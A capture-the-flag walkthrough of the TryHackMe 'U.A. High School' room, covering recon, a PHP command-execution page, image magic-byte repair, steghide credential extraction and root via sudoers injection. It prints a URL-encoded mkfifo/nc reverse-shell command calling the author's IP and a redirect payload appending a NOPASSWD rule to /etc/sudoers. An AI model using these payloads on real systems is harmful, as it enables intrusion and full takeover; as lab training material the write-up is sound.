---
title: U.A. High School
date: 2024-09-02 21:19:35 +0200
categories: [TryHackMe]
tags: [Web, RCE, Command Injection, Steganography, Magic Bytes]
description: Welcome to the web application of U.A., the Superhero Academy.
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_uahighschool/
image:
    path: room.png
---

## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** U.A. High School Official v4
- **Name:** [U.A. High School](https://tryhackme.com/r/room/yueiua)
- **Description:** Welcome to the web application of U.A., the Superhero Academy.

### Flags

1.  What is the user.txt flag?
2.  What is the root.txt flag??

### Author

- **Name:** [m3gakr4nus](https://tryhackme.com/p/m3gakr4nus)
- **Duration:** 2024-09-02 - 2024-09-02

## Initial Recon
Let's start with an nmap scan:
```console
$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.208.34
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

There is an **Apache webserver** running on **port 80**
![3eb7e593894b2f210fd17df670bd4066.png](3eb7e593894b2f210fd17df670bd4066.png){: w="700" h="300" .center}

After enumerating the website, we can see this `contact.html` page which accepts user-input.
![bae447c7a91e4aa4200460656ba4ad0c.png](bae447c7a91e4aa4200460656ba4ad0c.png){: w="700" h="300" .center .shadow}

But after further inspection, we see that the form doesn't really do anything because of the `action="#"` which simply reloads the webpage.

![a4931d2146b5cfdef62841f71aa3c64d.png](a4931d2146b5cfdef62841f71aa3c64d.png){: w="500" h="300" .center .shadow}

### Remote Code Execution
After spending some time enumerating directories and subdomains, we find the directory `/assets`

I started fuzzing this directory and that's when I found `index.php`
```console
$ gobuster dir -h "http://10.10.208.34/assets" -x php,html,txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

http://10.10.208.34/assets/.php                 (Status: 403) [Size: 277]
http://10.10.208.34/assets/.html                (Status: 403) [Size: 277]
http://10.10.208.34/assets/index.php            (Status: 200) [Size: 0]
http://10.10.208.34/assets/images               (Status: 301) [Size: 320] [--> http://10.10.208.34/assets/images/]
http://10.10.208.34/assets/.html                (Status: 403) [Size: 277]
http://10.10.208.34/assets/.php                 (Status: 403) [Size: 277]
```
{: .wrap }

This was very intressting to me since all other webpages were `html` files and since this was the only `php` file on the server, my spidey senses started tingling. So I added `?cmd=whoami` in the url and what do you know, we get something back:

![db7b5dc6c2804b42ec283a31e9c7ad8d.png](db7b5dc6c2804b42ec283a31e9c7ad8d.png){: w="600" h="300" .center .shadow}

> We could have fuzzed the parameters of this file by doing something like this:
> ```console
> wfuzz -u 'http://10.10.208.34/assets/index.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -c --hw 0
> ```
{: .prompt-tip}

## Flag 1

### Getting a reverse shell
Since the output looked like it's `base64 encoded`, I used curl and piped its output to `base64 -d`
![3eb44c3ef5420f709142a879d6a4a875.png](3eb44c3ef5420f709142a879d6a4a875.png){: w="700" h="300" .center .shadow}
- We are `www-data`
- Now we can simply run a reverse-shell payload and get access to the server

I used this payload (mkfifo) and url encoded it
```shell
$ curl -s 'http://10.10.208.34/assets/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.11.75.248%2053%20%3E%2Ftmp%2Ff'
```
{: .wrap }

![69935734020570476d0f257ef0e13d13.png](69935734020570476d0f257ef0e13d13.png){: w="700" h="300" .center .shadow}

### Enumeration
After some manual enumeration, I found the directory `/var/www/Hidden_Content` and inside, the file `passphrase.txt`:

![2ba05db707e51e482581a01bee530ce3.png](2ba05db707e51e482581a01bee530ce3.png){: w="600" h="300" .center .shadow}
- The password inside was `base64 encoded` so I simply decoded it with `base64 -d`

Let's see what users are on the system:
```console
$ grep --color '/bin/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
deku:x:1000:1000:deku:/home/deku:/bin/bash
```

I tried loging in via `SSH` with the user `deku` and the password that I had found but it wasn't the right password! So I used **linpeas** to enumerate the system further.

That is when I found this `/var/www/html/assets/images/oneforall.jpg`. Since I had only seen one picture on the website which was the background picture `yuei.jpg`, it got me curious.

### Magic Bytes - oneforall.jpg
So I downloaded the file and tried to opening it but it seemed to be corrupted.

After further inspection of the file, I realized that the magic bytes are indicating that this is a **PNG file**!
![9cb3240a2d191e1578b09998d69b0d0a.png](9cb3240a2d191e1578b09998d69b0d0a.png){: w="600" h="300" .center .shadow}
- So I looked up the magic bytes for `jpg` files and that's when I found this:
```text
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

> **List of magic bytes:** https://en.wikipedia.org/wiki/List_of_file_signatures
{: .prompt-tip}

![3715976f5a5a355a195b2d4905d74dba.png](3715976f5a5a355a195b2d4905d74dba.png){: w="600" h="300" .center .shadow}

I used `hexeditor` to modify the magic bytes.
![a09980c05b1fd371778f5e438fbcb8f8.png](a09980c05b1fd371778f5e438fbcb8f8.png){: w="600" h="300" .center .shadow}

> Magic bytes, also referred to as magic numbers or file signatures, are sequences of bytes located at the beginning of a file. They serve as a unique identifier for the file’s format or type. Just like a fingerprint distinguishes individuals, magic bytes distinguish file formats in the digital realm.
> 
> **Source:** https://medium.com/@Hackhoven/magic-bytes-in-cybersecurity-05e997a2c22e
{: .prompt-info }

### Steganography
After modifying the magic bytes, we can see the picture but sadly, there is nothing usefull for us in it.
![02f7e29d5c9f8847f5991c24c7c071de.png](02f7e29d5c9f8847f5991c24c7c071de.png){: w="600" h="300" .center .shadow}
Or is there...?

I though maybe there is something hidden inside. So I used `steghide` to find out.
![be1ab66b48582de19de4b47fdd1b3b2b.png](be1ab66b48582de19de4b47fdd1b3b2b.png){: w="400" h="300" .center .shadow}
- Sure enough, there is a file called `creds.txt` hidden inside.
- This is when I remembered the password inside the `passphrase.txt`

Using that password allowed me to extract the hidden file:
```console
$ steghide extract -sf ./oneforall.jpg -xf ./creds.txt
Enter passphrase: [REDACTED]
wrote extracted data to "./creds.txt".
```
![5c4113cf893a86e9dc84630bb10fa0f1.png](5c4113cf893a86e9dc84630bb10fa0f1.png){: w="700" h="300" .center .shadow}
- Seems like this is a hidden message meant for `deku`
- Inside, we find `deku`'s credentials

Let's SSH into the system.

Right there, inside `deku`'s home directory, we find our first flag.
![1ba4f08ad24fe0e929a4fd7c66090ecd.png](1ba4f08ad24fe0e929a4fd7c66090ecd.png){: w="450" h="300" .center .shadow}

## Flag 2
### Enumeration
Let's see if we can run anything as `sudo`.
```console
$ sudo -l
[sudo] password for deku: [REDACTED]
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```
{: .wrap }

Our user can run the `/opt/NewComponent/feedback.sh` file with **root permissions**. Let's see if we can modify the file and run our own commands.

![2ec67ea96d118cd48a3c77c672fcde4d.png](2ec67ea96d118cd48a3c77c672fcde4d.png){: w="600" h="300" .center .shadow}
- It seems like we're the owner of the file
- So this should be as easy as overwriting the file's content and running it as `sudo`
- But NO! We somehow can't change the file at all.

Looking closer at the permissions, we can see that the `i` flag is set on this file which keeps other users form modifying this file in any way.

![dfc6b51d7eb32594aaeebb709dd3f092.png](dfc6b51d7eb32594aaeebb709dd3f092.png){: w="400" h="300" .center .shadow}

> Learn more about `chattr`: 
> ```console
> $ man chattr
> ...
> i       A file with the 'i' attribute cannot be modified: it cannot be deleted or renamed, no link can be created to this file, 
        most of the  file's  metadata can not be modified, and the file can not be opened in write mode.
        Only the superuser or a process possessing the CAP_LINUX_IMMUTABLE capability can set or clear this attribute.
> ...
> ```
{: .prompt-info}

### Command Injection
Let's take a look at the script and see if we can do anything with it:
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
{: .wrap }
Let's break it down...

This simply outputs a banner to the screen.
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."
```

This piece of code takes an input and stores it inside a variable called `feedback`
```bash
echo "Enter your feedback:"
read feedback
```

This part checks if the user supplied `feedback` contains any of the following characters:  `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!` and/or `\`
```bash
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
```
{: .wrap }

If it **doesn't contain** any of those characters then it uses `eval` to `echo` our feedback to the screen and saves it to `/var/log/feedback.txt` which actually points to `/dev/null`
```bash
echo "It is This:"
eval "echo $feedback"

echo "$feedback" >> /var/log/feedback.txt
echo "Feedback successfully saved."
```

If our `feedback` however, **does contain** any of those characters, then we are shown an error.
```bash
else
    echo "Invalid input. Please provide a valid input." 
fi
```

After spending some time trying out different payloads, I realized that `>` character is not being filtered.
- That means we can actually modify files as `root` 
- By redirecting the `eval echo` command to a file of our own liking

We can do two things here
1. Either modify `/etc/passwd` and add a user with `uid 0` so when we log into the user, we have root access
2. Modify the `/etc/sudoers` file to give our current user root permissions

I went with the second one.

All we have to do is add `deku ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers`
- Since the `)` character is being filtered by the script, I passed `deku ALL=(ALL) NOPASSWD: ALL` an argument to the script
- Then I used `$1 >> /etc/sudoers` once the script asked me for feedback
- Here `$1` is simply **a variable** which contains **the first argument passed to the script** by the user

And after checking our `sudo` permissions, we see that we can **run anything** on the system **as root** without the need of a password.

![a54f533dec69e2adf9676f48afa96711.png](a54f533dec69e2adf9676f48afa96711.png){: w="600" h="300" .center .shadow}

We can now use `sudo su` to **pop a shell as root** and read the `/root/root.txt` file

![c048e16d91d12018c6c7273a11d609b9.png](c048e16d91d12018c6c7273a11d609b9.png){: w="600" h="300" .center .shadow}

## Outro
This was a very fun room. It was enumeration heavy for sure, but it kept the journey fun and interesting as it went on.

Many thanks to the creator of this room, [Fede1781](https://tryhackme.com/p/Fede1781).

\- m3gakr4nus
